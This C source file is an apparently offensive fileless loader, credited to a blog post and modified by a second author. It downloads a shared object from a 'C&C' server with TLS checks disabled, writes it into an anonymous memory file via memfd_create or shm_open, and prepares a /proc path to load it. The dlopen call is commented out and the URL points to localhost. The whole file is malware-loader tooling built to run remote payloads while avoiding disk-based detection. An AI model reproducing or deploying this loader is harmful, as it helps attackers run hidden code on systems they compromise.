/* from https://x-c3ll.github.io/posts/fileless-memfd_create */

#define _GNU_SOURCE


#include <curl/curl.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>



#define SHM_NAME "IceIceBaby"
#define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html

typedef struct {
 int shm_fd;
} Shared_Mem_Fd;

typedef struct {
  enum {SHM, MEMFD} mode;
  int fd;
  pid_t pid;
} Mem_Fd_Loc;


// Wrapper to call memfd_create syscall
inline int memfd_create(const char *name, unsigned int flags) {
	return syscall(__NR_memfd_create, name, flags);
}

// Detect if kernel is < or => than 3.17
// Ugly as hell, probably I was drunk when I coded it
int kernel_version() {
	struct utsname buffer;
	uname(&buffer);
	
	char *token;
	char *separator = ".";
	
	token = strtok(buffer.release, separator);
	if (atoi(token) < 3) {
		return 0;
	}
	else if (atoi(token) > 3){
		return 1;
	}

	token = strtok(NULL, separator);
	if (atoi(token) < 17) {
		return 0;
	}
	else {
		return 1;
	}
}


// Returns a file descriptor where we can write our shared object
int open_ramfs(void) {
	int shm_fd;

	//If we have a kernel < 3.17
	// We need to use the less fancy way
	if (kernel_version() == 0) {
		shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
		if (shm_fd < 0) { //Something went wrong :(
			fprintf(stderr, "[-] Could not open file descriptor\n");
			exit(-1);
		}
	}
	// If we have a kernel >= 3.17
	// We can use the funky style
	else {
		shm_fd = memfd_create(SHM_NAME, 1);
		if (shm_fd < 0) { //Something went wrong :(
			fprintf(stderr, "[- Could not open file descriptor\n");
			exit(-1);
		}
	}
	return shm_fd;
}

// Callback to write the shared object

static size_t write_data (void *ptr, size_t size, size_t nmemb, void* userp) {

    Shared_Mem_Fd *shm_fd_s = (Shared_Mem_Fd *)userp;
	if (write(shm_fd_s->shm_fd, ptr, nmemb) < 0) {
		fprintf(stderr, "[-] Could not write file :'(\n");
		close(shm_fd_s->shm_fd);
		exit(-1);
	}
	printf("[+] File written!\n");
}

// Download our share object from a C&C via HTTPs
int download_to_RAM(char *download) { 
	CURL *curl;
	CURLcode res;
	int shm_fd;

	shm_fd = open_ramfs(); // Give me a file descriptor to memory
	printf("[+] File Descriptor %d Shared Memory created!\n", shm_fd);

    Shared_Mem_Fd shm_fd_s = {0};
    shm_fd_s.shm_fd=shm_fd;


    curl_global_init(CURL_GLOBAL_DEFAULT);    
	// We use cURL to download the file
	// It's easy to use and we avoid to write unnecesary code
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, download);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-agent/1.0");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //Callback
        // Op_Nomad: Modded to avoid gcc warning 
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*) &shm_fd_s); //Args for our callback
		
		// Do the HTTPs request!
		res = curl_easy_perform(curl);
		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
			fprintf(stderr, "[-] cURL failed: %s\n", curl_easy_strerror(res));
			close(shm_fd);
			exit(-1);
		}
		curl_easy_cleanup(curl);
		return shm_fd;
	}
}

// Load the shared object from within
void load_so(int shm_fd, Mem_Fd_Loc *fd_s) {
	char path[1024];
	void *handle;

	printf("[+] Trying to load Shared Object!\n");
	if (kernel_version() == 1) { //Funky way
	    printf("[.] yay, memfd supported.\n");
		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
	} else { // Not funky way :(
		close(shm_fd);
		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
	    printf("[.] hmm, only shm supported.\n");
	}
    printf("Path: %s\n", path);
	/*handle = dlopen(path, RTLD_LAZY);
	if (!handle) {
		fprintf(stderr,"[-] Dlopen failed with error: %s\n", dlerror());
	}*/
}

int main (int argc, char **argv) {
	char *url = "http://localhost:8080/libmctor.so";
	int fd;

	printf("[+] Trying to reach C&C & start download...\n");
	fd = download_to_RAM(url);
    Mem_Fd_Loc *fd_s = malloc (sizeof (Mem_Fd_Loc));

    if (fd_s != NULL){
	  load_so(fd, fd_s);
    }else{
	  fprintf(stderr,"[-] Malloc() failed\n");
    }

    sleep(1000000);
	exit(0);
}
